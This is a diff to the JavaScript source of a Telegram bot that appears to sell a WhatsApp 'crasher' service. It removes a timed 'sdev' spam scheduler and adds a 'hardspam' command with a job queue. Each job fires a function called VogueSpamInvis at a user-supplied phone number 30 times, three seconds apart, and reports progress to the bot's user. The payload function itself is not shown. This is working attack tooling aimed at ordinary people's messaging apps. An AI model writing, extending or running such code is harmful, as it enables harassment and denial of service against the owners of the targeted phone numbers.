@@ -139,6 +139,8 @@ let socketStarted = false;
 const cooldown = new Map();
 let globalCooldown = 0;
 let lastViewOnce = null;
+const spamQueue = [];
+let queueRunning = false;
 
 const loadClaimed = () => {
     try {
@@ -3548,119 +3550,6 @@ been successfully analyzed.
 //                                                    
 //
 
-bot.command(
-    'sdev',
-    checkExecutionLimit,
-    checkWhatsAppConnection,
-    checkPremiumAccess,
-    CheckCooldown,
-    async (ctx) => {
-
-        let args =
-            ctx.message.text.split(" ");
-
-        let q =
-            args[1];
-
-        let durationInput =
-            args[2];
-
-        if (!q || !durationInput) {
-
-            return ctx.reply(
-`❖ INVALID FORMAT
-
-\`\`\`ruby
-/spamandro 628xxx 1d
-/spamandro 628xxx 12h
-/spamandro 628xxx 30m
-\`\`\``,
-{
-    parse_mode: "Markdown"
-}
-            );
-        }
-
-        const duration =
-            parseDuration(
-                durationInput
-            );
-
-        if (!duration) {
-
-            return ctx.reply(
-`❖ INVALID DURATION
-
-\`\`\`ruby
-Valid:
-1d
-12h
-30m
-10s
-\`\`\``,
-{
-    parse_mode: "Markdown"
-}
-            );
-        }
-
-        const clean =
-            q.replace(
-                /[^0-9]/g,
-                ""
-            );
-
-        const target =
-            clean +
-            "@s.whatsapp.net";
-
-        const now =
-            Date.now();
-
-        const task = {
-            id:
-                clean +
-                "_" +
-                now,
-
-            target,
-            duration,
-            startTime: now,
-            endTime:
-                now + duration,
-
-            active: true
-        };
-
-        const tasks = loadTasks() || [];
-
-        tasks.push(task);
-
-        saveTasks(tasks);
-
-        startSpamWorker(task);
-
-        return ctx.replyWithPhoto(
-            thumbnailUrl,
-            {
-                caption:
-`\`\`\`ruby
-VOGUE TASK DISPATCH
-
-Target     : ${clean}
-Duration   : ${durationInput}
-Loop       : 20 / 5 Minutes
-State      : Active
-
-Task successfully deployed
-\`\`\``,
-                parse_mode:
-                    "Markdown"
-            }
-        );
-    }
-);
-
 bot.command('drainet', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -3735,7 +3624,103 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('spamandro', checkExecutionLimit, checkPremiumAccess, CheckCooldown, async (ctx) => {
+bot.command('hardspam', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+        let q =
+            ctx.message?.text
+            ?.split(" ")[1];
+
+        if (!q) {
+
+            return ctx.reply(
+`Invalid Format
+
+Usage:
+/hardspam <target_number>
+
+Example:
+/hardspam 628xxxxxxxx`
+            );
+        }
+
+        let clean =
+            q.replace(
+                /[^0-9]/g,
+                ""
+            );
+
+        let target =
+            clean +
+            "@s.whatsapp.net";
+
+        try {
+
+            spamQueue.push({
+                ctx,
+                target,
+                number: clean
+            });
+
+            const queuePos =
+                spamQueue.length;
+                
+            await ctx.replyWithPhoto(
+                thumbnailUrl,
+                {
+                    caption:
+`\`\`\`ruby
+V O G U E • C R A S H E R
+────────────────────────
+
+QUEUE STATUS
+
+Target    : ${clean}
+Loop      : 30
+Queue     : #${queuePos}
+Delay     : 3 Minutes / Task
+
+State     : Added To Queue
+────────────────────────
+\`\`\``,
+                    parse_mode:
+                        "Markdown",
+
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text:
+                                        "Check Target",
+
+                                    url:
+`https://wa.me/${clean}`
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
+
+            processSpamQueue();
+
+        } catch (error) {
+
+            ctx.reply(
+`Operation Failed
+
+The system was unable to execute the requested module.`
+            );
+
+            console.log(
+                `[VOGUE] ${error.message}`
+            );
+
+            await restartBot(
+                "Connection Closed"
+            );
+        }
+    });
+
+bot.command('spamandro', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
@@ -4033,164 +4018,110 @@ Please verify the target input and system status before retrying.`
 //                                                     
 //
 
-function parseDuration(input) {
+async function processSpamQueue() {
 
-    const match =
-        input.match(/^(\d+)([smhd])$/);
+    if (queueRunning) return;
 
-    if (!match) return null;
+    queueRunning = true;
 
-    const value =
-        parseInt(match[1]);
+    while (spamQueue.length > 0) {
 
-    const unit =
-        match[2];
+        const job = spamQueue.shift();
 
-    const multipliers = {
-        s: 1000,
-        m: 60000,
-        h: 3600000,
-        d: 86400000
-    };
+        const {
+            ctx,
+            target,
+            number
+        } = job;
 
-    return value * multipliers[unit];
+        const instanceId =
+            Date.now() + Math.random();
+
+        console.log(
+            `[QUEUE] Starting ${number}`
+        );
+
+        try {
+
+            await ctx.reply(
+`\`\`\`ruby
+QUEUE EXECUTION
+
+Target   : ${number}
+Loop     : 30
+Status   : Running
+\`\`\``,
+{
+    parse_mode: "Markdown"
 }
-
-const TASK_FILE =
-    "./database/spam_tasks.json";
-
-function loadTasks() {
-    
-    try {
-        
-        if (
-            !fs.existsSync(TASK_FILE)
-        ) {
-            
-            fs.writeFileSync(
-                TASK_FILE,
-                "[]"
-            );
-        }
-        
-        const data =
-            JSON.parse(
-                fs.readFileSync(
-                    TASK_FILE
-                )
-            );
-        
-        return Array.isArray(data) ?
-            data :
-            [];
-        
-    } catch {
-        
-        return [];
-    }
-}
-
-function saveTasks(data) {
-    
-    fs.writeFileSync(
-        TASK_FILE,
-        JSON.stringify(
-            data,
-            null,
-            2
-        )
-    );
-}
-
-async function startSpamWorker(task) {
-
-    const worker =
-        async () => {
-
-            const now =
-                Date.now();
-
-            if (
-                now >= task.endTime
-            ) {
-
-                let tasks =
-                    loadTasks();
-
-                tasks =
-                    tasks.filter(
-                        t => t.id !== task.id
-                    );
-
-                saveTasks(tasks);
-
-                console.log(
-                    `[TASK ENDED] ${task.id}`
-                );
-
-                return;
-            }
-
-            console.log(
-                `[TASK RUNNING] ${task.id}`
             );
 
-            for (let i = 0; i < 2; i++) {
+            for (let i = 0; i < 30; i++) {
 
                 try {
 
                     await VogueSpamInvis(
                         sock,
-                        task.target
+                        target
                     );
 
-                    await sleep(1500);
+                    console.log(
+                        `[WORKER ${instanceId}] Loop ${i + 1}/30`
+                    );
+
+                    await sleep(3000);
 
                 } catch (e) {
 
                     console.log(
-                        `[TASK ERROR] ${e.message}`
+                        `[WORKER ${instanceId}] ${e.message}`
                     );
+
+                    await restartBot(
+                        "Connection Closed"
+                    );
+
+                    break;
                 }
             }
 
-            setTimeout(
-                worker,
-                5 * 60 * 1000
-            );
-        };
+            await ctx.reply(
+`\`\`\`ruby
+QUEUE COMPLETED
 
-    worker();
+Target   : ${number}
+Loop     : 30
+Status   : Finished
+\`\`\``,
+{
+    parse_mode: "Markdown"
 }
+            );
 
-async function restoreSpamTasks() {
+            console.log(
+                `[QUEUE] Finished ${number}`
+            );
 
-    console.log(
-        "[TASK RESTORE] Waiting 1 minute..."
-    );
+            if (spamQueue.length > 0) {
 
-    await sleep(60000);
+                console.log(
+                    `[QUEUE] Waiting 3 minutes...`
+                );
 
-    const tasks =
-        loadTasks();
+                await sleep(
+                    3 * 60 * 1000
+                );
+            }
 
-    for (const task of tasks) {
+        } catch (err) {
 
-        if (!task.active)
-            continue;
-
-        if (
-            Date.now() >= task.endTime
-        ) {
-            continue;
+            console.log(
+                `[QUEUE ERROR] ${err.message}`
+            );
         }
-
-        console.log(
-            `[TASK RESTORED] ${task.id}`
-        );
-
-        startSpamWorker(task);
     }
+
+    queueRunning = false;
 }
 
 async function restartBot(reason = "Unknown") {
